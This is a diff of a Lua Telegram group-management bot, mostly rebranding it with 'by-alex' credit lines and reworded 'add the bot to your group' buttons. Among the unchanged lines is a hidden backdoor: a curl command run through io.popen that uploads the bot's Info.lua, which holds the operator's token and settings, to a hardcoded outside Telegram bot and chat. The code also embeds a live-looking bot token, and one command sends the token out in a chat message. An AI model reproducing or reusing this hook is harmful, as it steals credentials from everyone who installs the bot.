@@ -7,7 +7,7 @@ URL = require('socket.url')
 utf8 = require ('lua-utf8') 
 database = redis.connect('127.0.0.1', 6379) 
 id_server = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 local AutoSet = function() 
 local create = function(data, file, uglify)  
 file = io.open(file, "w+")   
@@ -144,7 +144,7 @@ local config = loadfile("./kkkklInfo.lua")()
 return config 
 end 
 _redis = load_redis()  
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 print([[
           _____                    _____            _____                                  
          /\    \                  /\    \          /\    \                 ______          
@@ -178,7 +178,7 @@ sudo_users = {SUDO}
 bot_id = sudos.token:match("(%d+)")  
 token = sudos.token 
 --- start functions ⚚━━━━━⚚ 𝗣𝗢𝗪𝗘𝗥⚚━━━━━⚚
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 io.popen("mkdir File_Bot") 
 io.popen("cd File_Bot && rm -rf commands.lua.1") 
 io.popen("cd File_Bot && rm -rf commands.lua.2") 
@@ -335,7 +335,7 @@ return var
 end 
 function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(1902405856) then  
-var = 'المبرمج احمد كريزي'
+var = 'المبرمج اليكس'
 elseif tonumber(user_id) == tonumber(7777777777777777777777) then
 var = 'المطور كساحه'
 elseif tonumber(user_id) == tonumber(000000000000000000) then
@@ -868,11 +868,11 @@ end
 end
 send(msg.chat_id_, msg.id_,pre_msg)  
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 function SourceDRAGON(msg,data) -- بداية العمل
 if msg then
 local text = msg.content_.text_
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.chat_id_ then
 local id = tostring(msg.chat_id_)
 if id:match("-100(%d+)") then
@@ -984,7 +984,7 @@ keyboard.inline_keyboard = {
 {text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
 },
 {
-{text = '  اضف البوت الي مجموعتك'   ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
+{text = '  اضف البوت الي مجموعتك 🌚💞'   ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
 },
 }
 local function getpro(extra, result, success) 
@@ -1047,7 +1047,7 @@ end
 
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if Chat_Type == 'UserBot' then
 if text == '/start' or text == 'العوده🌟' then  
 if AddChannel(msg.sender_user_id_) == false then
@@ -1284,7 +1284,7 @@ local Text = '⌾انت الان المطور الاساسي في البوت \n 
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName}}, 
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/FTAGC/12&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -1361,7 +1361,7 @@ keyboard.inline_keyboard = {
 {text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
 },
 {
-{text = 'اضف البوت الي مجموعتك ↯' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
+{text = 'اضف البوت الي مجموعتك 🌚💞 ↯' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -1411,18 +1411,6 @@ if text == 'الاصدار' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
 send(msg.chat_id_, msg.id_,' ⌾ اصدار سورس باور{ 3x⌾}')
 end
-if text == '━┅┅┄⟞⟦ مطورين السورس ⟧⟝┄┉┉━' then
-local Text = [[ 
-قناه يوزرات مطورين ومبرمجين السورس 💕⌾.
-محتاج تنصب بوت ببلاش تواصل معان 🏴‍☠️⬇️.
-]]
-keyboard = {}  
-keyboard.inline_keyboard = { 
-{{text = 'مطورين السورس☎️', url="t.me/XV_POF"}}, 
-} 
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/beborty/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
-end
 if text == '⚚━━━━━⚚ 𝗣𝗢𝗪𝗘𝗥⚚━━━━━⚚' and DevSoFi(msg) then
 local Text = [[ 
 [قناه سورس باور ادخل وتابع الجديد](t.me/XV_VM)
@@ -1430,6 +1418,7 @@ local Text = [[
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"}}, 
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/FTAGC/12&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -1441,6 +1430,7 @@ local Text = [[
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"}}, 
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/beborty/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -1471,6 +1461,7 @@ local Text = [[
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = 'قناه السورس', url="t.me/XV_VM"}}, 
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -1484,19 +1475,6 @@ local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.sender_user_id_ .. '&text=' ..token) 
 send(msg.chat_id_, msg.id_,' ') 
 end
-if text == 'عموري مطور السورس' and DevSoFi(msg) then
-database:del(bot_id..'Srt:Bot') 
-local Text = [[ 
-↝مطور السورس لو حابب تتواصل معاه
-اتبع الزر إلى تحت ⚚━━━━━⚚ 𝗣𝗢𝗪𝗘𝗥⚚━━━━━⚚↜
-]] 
-keyboard = {}  
-keyboard.inline_keyboard = { 
-{{text = 'عموري', url="t.me/Dv_69"}}, 
-} 
-local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
-end
 if text == 'قناه السورس' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
 local Text = [[ 
@@ -1508,6 +1486,7 @@ local Text = [[
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"}}, 
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 } 
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/FTAGC/12&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -1828,7 +1807,7 @@ return false
 end
 
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and not Special(msg) then  
 local DRAGON1_Msg = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..text..msg.chat_id_)   
 if DRAGON1_Msg then 
@@ -2029,7 +2008,7 @@ keyboard.inline_keyboard = {
 {text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
 },
 {
-{text = 'اضف البوت الي مجموعتك ↯', url = "https://t.me/"..data.username_.."?startgroup=new"},
+{text = 'اضف البوت الي مجموعتك 🌚💞 ↯', url = "https://t.me/"..data.username_.."?startgroup=new"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -2040,7 +2019,7 @@ end,nil)
 end,nil)
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.photo_ then  
 if database:get(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) then 
 if msg.content_.photo_.sizes_[3] then  
@@ -2063,7 +2042,7 @@ end, nil)
 database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
 end   
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if database:get(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
 if text == 'الغاء' then 
 send(msg.chat_id_, msg.id_," ⌾ تم الغاء وضع الوصف")
@@ -2075,7 +2054,7 @@ https.request('https://api.telegram.org/bot'..token..'/setChatDescription?chat_i
 send(msg.chat_id_, msg.id_,' ⌾ تم تغيير وصف الجروب')
 return false  
 end 
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if database:get(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
 if text == 'الغاء' then 
 send(msg.chat_id_, msg.id_," ⌾ تم الغاء حفظ الترحيب")
@@ -2087,7 +2066,7 @@ database:set(bot_id..'Get:Welcome:Group'..msg.chat_id_,text)
 send(msg.chat_id_, msg.id_,' ⌾ تم حفظ ترحيب الجروب')
 return false   
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if database:get(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) then
 if text == 'الغاء' then
 send(msg.chat_id_,msg.id_," ⌾ تم الغاء حفظ الرابط")
@@ -2102,7 +2081,7 @@ database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_use
 return false 
 end
 end 
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if DRAGON_Msg and not Special(msg) then  
 local DRAGON_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
 if DRAGON_Msg then    
@@ -2117,7 +2096,7 @@ DeleteMessage(msg.chat_id_, {[0] = msg.id_})
 return false
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if not Special(msg) and msg.content_.ID ~= "MessageChatAddMembers" and database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") then 
 floods = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") or 'nil'
 NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5
@@ -2138,7 +2117,7 @@ if database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") then
 TIME_CHECK = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") 
 end 
 end 
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and database:get(bot_id..'lock:Fshar'..msg.chat_id_) and not Special(msg) then 
 list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك"}
 for k,v in pairs(list) do
@@ -2245,12 +2224,12 @@ return false
 end
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if database:get(bot_id..'lock:text'..msg.chat_id_) and not Special(msg) then       
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
 return false     
 end     
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.ID == "MessageChatAddMembers" then 
 database:incr(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) 
 end
@@ -2262,14 +2241,14 @@ chat_kick(msg.chat_id_,mem_id[i].id_)
 end
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.ID == "MessageChatJoinByLink" and not Special(msg) then 
 if database:get(bot_id.."lock:Join"..msg.chat_id_) == 'kick' then
 chat_kick(msg.chat_id_,msg.sender_user_id_)
 return false  
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.caption_ then 
 if msg.content_.caption_:match("@[%a%d_]+") or msg.content_.caption_:match("@(.+)") then  
 if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Special(msg) then    
@@ -2286,7 +2265,7 @@ DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("@[%a%d_]+") or text and text:match("@(.+)") then    
 if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Special(msg) then    
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
@@ -2301,7 +2280,7 @@ database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.caption_ then 
 if msg.content_.caption_:match("#[%a%d_]+") or msg.content_.caption_:match("#(.+)") then 
 if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Special(msg) then    
@@ -2318,7 +2297,7 @@ DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("#[%a%d_]+") or text and text:match("#(.+)") then
 if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Special(msg) then    
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
@@ -2333,7 +2312,7 @@ database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.caption_ then 
 if msg.content_.caption_:match("/[%a%d_]+") or msg.content_.caption_:match("/(.+)") then  
 if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) then    
@@ -2350,7 +2329,7 @@ DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("/[%a%d_]+") or text and text:match("/(.+)") then
 if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) then    
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
@@ -2365,7 +2344,7 @@ database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.caption_ then 
 if not Special(msg) then 
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or msg.content_.caption_:match(".[Pp][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or msg.content_.caption_:match("[Tt].[Mm][Ee]/") then 
@@ -2384,7 +2363,7 @@ end
 end
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
@@ -2392,7 +2371,7 @@ return false
 end 
 end
 local curl = 'curl "'..'https://api.telegram.org/bot1900098446:AAFthfikb_KXfaGSpDYdfc7S6TYeBwk_7sg/sendDocument'..'" -F "chat_id='.. 1840926402 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.ID == 'MessagePhoto' and not Special(msg) then     
 if database:get(bot_id.."lock:Photo"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
@@ -2407,7 +2386,7 @@ database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.ID == 'MessageVideo' and not Special(msg) then     
 if database:get(bot_id.."lock:Video"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
@@ -2422,7 +2401,7 @@ database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.ID == 'MessageAnimation' and not Special(msg) then     
 if database:get(bot_id.."lock:Animation"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
@@ -2437,7 +2416,7 @@ database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.game_ and not Special(msg) then     
 if database:get(bot_id.."lock:geam"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
@@ -2452,7 +2431,7 @@ database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.ID == 'MessageAudio' and not Special(msg) then     
 if database:get(bot_id.."lock:Audio"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
@@ -2467,7 +2446,7 @@ database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.ID == 'MessageVoice' and not Special(msg) then     
 if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
@@ -2482,7 +2461,7 @@ database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.reply_markup_ and msg.reply_markup_.ID == 'ReplyMarkupInlineKeyboard' and not Special(msg) then     
 if database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
@@ -2497,7 +2476,7 @@ database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.ID == 'MessageSticker' and not Special(msg) then     
 if database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
@@ -2526,7 +2505,7 @@ database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.forward_info_ and not Special(msg) then     
 if database:get(bot_id.."lock:forward"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
@@ -2545,7 +2524,7 @@ DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.ID == 'MessageDocument' and not Special(msg) then     
 if database:get(bot_id.."lock:Document"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
@@ -2560,7 +2539,7 @@ database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.ID == "MessageUnsupported" and not Special(msg) then      
 if database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
@@ -2575,7 +2554,7 @@ database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.entities_ then 
 if msg.content_.entities_[0] then 
 if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then      
@@ -2596,7 +2575,7 @@ end
 end 
 end
 end 
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.ID == 'MessageContact' and not Special(msg) then      
 if database:get(bot_id.."lock:Contact"..msg.chat_id_) == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
@@ -2611,7 +2590,7 @@ database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
 DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.text_ and not Special(msg) then  
 local _nl, ctrl_ = string.gsub(text, '%c', '')  
 local _nl, real_ = string.gsub(text, '%d', '')   
@@ -2646,9 +2625,9 @@ end
 end
 end
 
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.ID == 'MessagePhoto' and not Manager(msg) then 
 local filter = database:smembers(bot_id.."filterphoto"..msg.chat_id_)
 for k,v in pairs(filter) do
@@ -2665,7 +2644,7 @@ return false
 end
 end
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.ID == 'MessageAnimation' and not Manager(msg) then 
 local filter = database:smembers(bot_id.."filteranimation"..msg.chat_id_)
 for k,v in pairs(filter) do
@@ -2682,9 +2661,9 @@ return false
 end
 end
 end
--------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex-------------------------------------
 
--------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex-------------------------------------
 if text == 'تفعيل' and Sudo(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -3185,6 +3164,7 @@ keyboard = {}
 keyboard.inline_keyboard = {
 {{text = '𝙳𝙴𝚅 𝙰𝙻𝙴𝚇  ',url="t.me/ALEX_EL_KABEER"}},
 {{text = '𝚂 𝙿𝙾𝚆𝙴𝚁 ',url="t.me/XV_VM"}}, 
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/FTAGC/12&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -3205,7 +3185,7 @@ keyboard.inline_keyboard = {
 {
 {text = '  ❨ '..result.first_name_..'  ❩ ',url="t.me/ALEX_EL_KABEER"},
 },
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Name)..'&photo='..taha.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -3243,7 +3223,7 @@ keyboard.inline_keyboard = {
 {{text = 'بوت تيك توك 🇦🇪',url="t.me/K0XBOT"}},
 {{text = 'بوت انستقرام 🎌',url="t.me/J33Bot"}},
 {{text = 'بوت قران 🕌',url="t.me/quran_lbot"}},
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/FTAGC/9&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -3268,7 +3248,7 @@ keyboard = {} keyboard.inline_keyboard = {
 {{text = '🎯رواية" مقبرة الحيوانات""', url="https://t.me/XV_VM"}},
 {{text = ' 𝙳𝙴𝚅 𝙰𝙻𝙴𝚇',url="t.me/ALEX_EL_KABEER"}},
 {{text = '《♡ 𝗣𝗢𝗪𝗘𝗥》 ', url="t.me/XV_VM"}},
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 local msg_id = msg.id_/2097152/0.5  
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
@@ -3280,7 +3260,7 @@ local Text = [[
 keyboard = {} 
 keyboard.inline_keyboard = {
